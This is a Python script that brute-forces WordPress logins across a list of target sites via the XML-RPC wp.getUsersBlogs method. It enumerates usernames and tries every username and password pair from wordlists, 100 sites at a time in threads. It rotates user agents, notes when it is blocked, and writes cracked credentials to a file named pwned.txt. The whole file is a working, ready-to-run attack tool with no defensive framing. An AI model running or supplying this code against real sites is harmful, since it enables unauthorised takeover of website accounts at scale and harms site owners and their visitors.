import requests
import re
import threading
import getwpusers
import useragent
from tqdm import tqdm
import itertools
result = []
def send_request(url,data):
    try:
        req = requests.post(url, data, headers={
            'Content-Type': 'application/xml','User-agent': useragent.get_useragent()})
        if 'xml' in req.headers['Content-Type']:
            rsp = req.content.decode('utf-8')
            if('faultCode' in rsp):
                return "1"
        else:
            rsp = "0"
        return rsp
    except:
        return "0"

def result_analyzer(content):
    if(content !=""):
        match = re.search(r'<int>(\d+)</int>', content)
        if match:
            return False
        else:
            match2 = re.search(r'<name>faultCode</name>\s*<value>\s*<int>(\d+)</int>\s*</value>', content)
            if(match2):
                return False
            else:
                #print(content)
                return True
def conf(url):
    usernames = getwpusers.user_check(url)
    if(usernames == None):
        with open("files/username.txt", "r") as f:
            usernames = f.readlines()
    with open("files/passwords.txt", "r") as f:
        passwords = f.readlines()
    ttl = len(list(itertools.product(usernames,passwords)))
    pbar_combination = tqdm(total=ttl,desc=f'{url} - combination')
    for username in usernames:
        for password in passwords:
            pbar_combination.update(1)
            data = f"""
                    <methodCall> 
                    <methodName>wp.getUsersBlogs</methodName> 
                    <params> 
                    <param><value>{username}</value></param> 
                    <param><value>{password}</value></param> 
                    </params> 
                    </methodCall>
            """
            content =send_request(url,data)
            if(content =="0"):
                pbar_combination.set_description_str(f"{url} - Blocked")
                return "0"
            elif(content == "1"):
                pass
            else:
                ishacked = result_analyzer(content)
                if(ishacked):
                    txt = f"{url}||{username}||{password}"
                    pbar_combination.set_description_str("{url} Pattern Found!")
                    #print(txt,"Pattern Found!")
                    #print(content)
                    result.append(txt)
                    return txt

def write_list_to_file():
    list_to_write = result
    with open("pwned.txt", "w") as f:
        for item in list_to_write:
            f.write(f"{item}\n")

def main():
    lines = open("files/results.txt", "r").read().splitlines()
    threads = []
    i = 0
    while i < len(lines):
        for j in range(i, min(i + 100, len(lines))):
            try:
                t = threading.Thread(target=conf, args=(lines[j],))
                threads.append(t)
                t.start()
            except Exception as e:
                pass
        for t in threads:
            t.join()
        i += 100
        threads = []
    write_list_to_file()

main()
